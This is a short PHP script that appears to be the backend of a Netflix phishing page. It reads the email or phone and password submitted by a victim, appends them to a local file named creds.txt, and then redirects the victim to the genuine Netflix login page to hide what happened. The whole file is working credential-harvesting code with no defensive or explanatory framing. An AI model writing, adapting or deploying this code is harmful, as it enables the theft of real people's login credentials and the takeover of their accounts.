<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Capture credentials
    $email = isset($_POST['email']) ? $_POST['email'] : 'No Email';
    $pass = isset($_POST['pass']) ? $_POST['pass'] : 'No Password';

    // Save into creds.txt
    $data = "Email/Phone: " . $email . "\nPassword: " . $pass . "\n----------------------\n";
    file_put_contents('creds.txt', $data, FILE_APPEND);

    // Redirect to real Netflix
    header('Location: https://www.netflix.com/login');
    exit();
}
?>

<!-- If someone opens login.php directly, show nothing -->
